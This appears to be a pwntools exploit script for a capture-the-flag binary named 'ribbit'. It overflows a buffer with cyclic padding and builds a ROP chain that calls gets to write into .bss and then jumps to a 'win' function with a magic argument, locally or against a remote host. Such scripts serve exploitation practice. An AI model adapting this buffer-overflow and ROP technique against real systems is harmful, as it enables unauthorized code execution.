#!/usr/bin/env python3
from pwn import *

elf = ELF("./ribbit")

context.binary = elf
context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "bash", "-c"]

def conn():
    if args.REMOTE:
        io = remote(args.HOST, args.PORT)
        # io = remote("addr", 1337)
    else:
        io = process([elf.path])
        if args.GDB:
            # context.log_level = "debug"
            gdb.attach(io)

    return io

io = conn()

pop_rdi = 0x000000000040201f
pop_rsi = 0x000000000040a04e

payload = fit([
    cyclic(0x28),
    pop_rdi,
    elf.bss(),
    elf.sym["_IO_gets"],
    pop_rdi,
    0xf10c70b33f,
    pop_rsi,
    elf.bss(),
    elf.sym["win"]
])

io.sendline(payload)
io.clean()
io.sendline(b"You got this!"+cyclic(8)+b"Just do it!")

io.interactive()
